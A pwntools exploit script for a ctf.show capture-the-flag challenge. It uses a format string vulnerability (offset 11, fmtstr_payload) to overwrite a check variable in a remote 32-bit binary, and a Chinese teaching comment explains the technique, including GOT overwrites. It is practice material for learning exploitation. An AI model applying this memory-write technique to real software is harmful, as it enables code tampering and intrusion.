from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28112)
elf = ELF("./pwn")

# check_addr = 0x804b040：需要修改的目标地址，需要将其值改为1
check_addr = 0x804b040

# test = b'aaaa' + b'%p ' * 30：用于测试格式化字符串的偏移量
test = b'aaaa' + b'%p ' * 30

# offset = 11：格式化字符串的偏移量，即第11个参数开始是我们可控的数据
offset = 11

# 等待提示信息
io.recvuntil("You can use two command('cat /ctfshow_flag' & 'shutdown')")

# payload = fmtstr_payload(offset, {check_addr:1})：构造格式化字符串payload
# 将check_addr地址处的值修改为1
payload = fmtstr_payload(offset, {check_addr:1})

io.send(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞写入操作
2. 核心原理：
   - 利用格式化字符串漏洞修改内存中的值
   - 将check_addr地址处的值修改为1
3. 关键参数：
   - offset = 11：格式化字符串的偏移量
   - {check_addr:1}：将check_addr地址处的值修改为1
4. 执行流程：
   - 等待程序提示
   - 构造并发送格式化字符串payload
   - 触发漏洞，修改目标地址的值
5. 格式化字符串漏洞利用技巧：
   - fmtstr_payload函数自动生成合适的格式化字符串
   - 通过指定偏移量和目标地址及值，实现精准内存写入
   - 常用于修改关键变量、GOT表等
"""
